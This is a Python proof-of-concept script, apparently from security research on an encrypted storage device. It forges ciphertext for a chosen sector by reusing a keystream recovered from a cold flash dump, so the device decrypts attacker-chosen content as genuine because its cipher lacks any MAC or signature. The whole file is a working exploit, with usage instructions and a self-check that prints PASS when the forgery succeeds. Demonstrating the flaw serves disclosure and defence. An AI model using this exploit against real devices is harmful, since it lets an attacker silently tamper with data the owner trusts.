#!/usr/bin/env python3
"""
attack2 -- evil-maid content forgery. The storage cipher has no MAC or signature
(CWE-345), so anyone who knows the keystream can WRITE arbitrary plaintext into
the encrypted volume: encrypt attacker-chosen bytes with the same positional
keystream, and the device decrypts them back as genuine content on the next read.

The keystream is recovered from a cold dump with no firmware/PIN (attack3), then
reused in the encrypt direction (XOR is its own inverse). The forged ciphertext
is what you would drop onto the flash via a write channel (write10 after any
unlocked session, a BOOTSEL reflash, or a chip programmer).

Usage: python3 forge_sector.py <flash_dump.bin> [target_LBA]
"""
import os
import sys

import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "attack3"))
import recover_keystream as R  # noqa: E402  (shared generator, single source of the cipher math)

SEC = R.SEC


def forge(ct_dump, target_lba, payload):
    """Return the ciphertext bytes to write at target_lba so the device decrypts
    them to `payload` (padded to a sector with 0x00)."""
    A, seed, B, W = R.recover(ct_dump)
    args = R.position_args(target_lba + 1, A, B, W)[target_lba * SEC:(target_lba + 1) * SEC]
    ks = R.keystream_from_args(args, seed)
    pt = (payload + b"\x00" * SEC)[:SEC]
    forged = (np.frombuffer(pt, dtype=np.uint8) ^ ks).tobytes()
    return forged, (A, seed, B, W)


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2
    dump = open(argv[1], "rb").read()
    ct = dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN]
    target_lba = int(argv[2]) if len(argv) > 2 else 48    # first data sector by default

    payload = (b"OWNED BY THE EVIL MAID -- this content was forged with the "
               b"device's own keystream; no MAC, no signature, nothing rejected it.\n")
    forged, gen = forge(ct, target_lba, payload)

    # Verify the device would decrypt the forged sector back to our payload,
    # exactly as the firmware read10 would for this LBA.
    args = R.position_args(target_lba + 1, gen[0], gen[2], gen[3])[target_lba * SEC:(target_lba + 1) * SEC]
    back = (np.frombuffer(forged, dtype=np.uint8) ^ R.keystream_from_args(args, gen[1])).tobytes()
    ok = back.startswith(payload)

    print(f"[*] recovered keystream (B=0x{gen[2]:08X} W=0x{gen[3]:08X}); forging LBA {target_lba}")
    print(f"[*] forged ciphertext (first 16 bytes): {forged[:16].hex(' ')}")
    print(f"[*] device would decrypt it to        : {back[:len(payload)]!r}")
    print(f"[{'PASS' if ok else 'FAIL'}] forged sector decrypts to attacker-chosen plaintext "
          f"-- no integrity check rejects it (CWE-345)")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
